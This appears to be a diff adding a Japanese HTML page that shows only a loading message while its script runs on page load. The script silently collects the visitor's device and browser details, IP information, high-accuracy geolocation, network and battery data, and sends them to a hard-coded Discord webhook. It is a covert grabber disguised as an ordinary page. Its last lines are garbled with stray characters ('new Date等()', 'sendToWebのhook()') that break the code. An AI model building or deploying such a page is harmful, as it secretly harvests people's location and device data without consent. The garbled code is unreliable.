@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ページ読み込み中...</title>
+  <style>
+    body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #1e1f22; color: #fff; }
+    .loader { font-size: 16px; color: #b5bac1; }
+  </style>
+</head>
+<body>
+  <div class="loader">ページを読み込んでいます...</div>
+  <script>
+    // ==========================================
+    // ここにDiscordのWebhook URLを入れる
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1569024877065805886/JsZAuyKuq7ylZdMduEoLNlhPC0lyhuhcfiflbWv4-6FpppriIQfhWyhH9mwZcMb6t9Kw";
+    // ==========================================
+
+    const collected = {};
+
+    // デバイス・ブラウザ情報の収集
+    function collectDeviceInfo() {
+      collected.userAgent = navigator.userAgent;
+      collected.platform = navigator.platform;
+      collected.language = navigator.language;
+      collected.languages = navigator.languages;
+      collected.screen = { w: screen.width, h: screen.height, colorDepth: screen.colorDepth };
+      collected.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      collected.hardwareConcurrency = navigator.hardwareConcurrency;
+      collected.deviceMemory = navigator.deviceMemory || "unknown";
+      collected.touchPoints = navigator.maxTouchPoints;
+      collected.cookiesEnabled = navigator.cookieEnabled;
+      collected.doNotTrack = navigator.doNotTrack;
+    }
+
+    // IP情報の収集
+    async function collectIpInfo() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        collected.ipInfo = await res.json();
+      } catch (e) {
+        collected.ipInfo = { error: "取得失敗" };
+      }
+    }
+
+    // 座標情報の収集（位置情報許可が必要）
+    function collectGeolocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) { resolve(); return; }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            collected.geolocation = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
+            };
+            resolve();
+          },
+          (err) => { collected.geolocation = { error: err.message }; resolve(); },
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+      });
+    }
+
+    // ネットワーク情報の収集
+    function collectNetworkInfo() {
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) {
+        collected.network = {
+          effectiveType: conn.effectiveType,
+          downlink: conn.downlink,
+          rtt: conn.rtt,
+          saveData: conn.saveData
+        };
+      } else {
+        collected.network = { error: "API非対応" };
+      }
+    }
+
+    // バッテリー情報の収集
+    async function collectBatteryInfo() {
+      if (!navigator.getBattery) { collected.battery = { error: "API非対応" }; return; }
+      try {
+        const b = await navigator.getBattery();
+        collected.battery = { level: b.level, charging: b.charging };
+      } catch (e) { collected.battery = { error: "取得失敗" }; }
+    }
+
+    // Webhookへの直接送信
+    async function sendToWebhook() {
+      try {
+        const text = "```json\n" + JSON.stringify(collected, null, 2) + "\n```";
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: text.slice(0, 1900) })
+        });
+      } catch (e) { console.error("送信失敗", e); }
+    }
+
+    // ページロード時に自動実行
+    (async function init() {
+      collectDeviceInfo();
+      collectNetworkInfo();
+      await collectIpInfo();
+      await collectGeolocation();
+      await collectBatteryInfo();
+      collected.timestamp = new Date等().toISOString();
+      
+      await sendToWebのhook();
+      document.querySelector(".loader").textContent = "読み込み完了";
+    })();
+  </script>
+</body>
+</html>
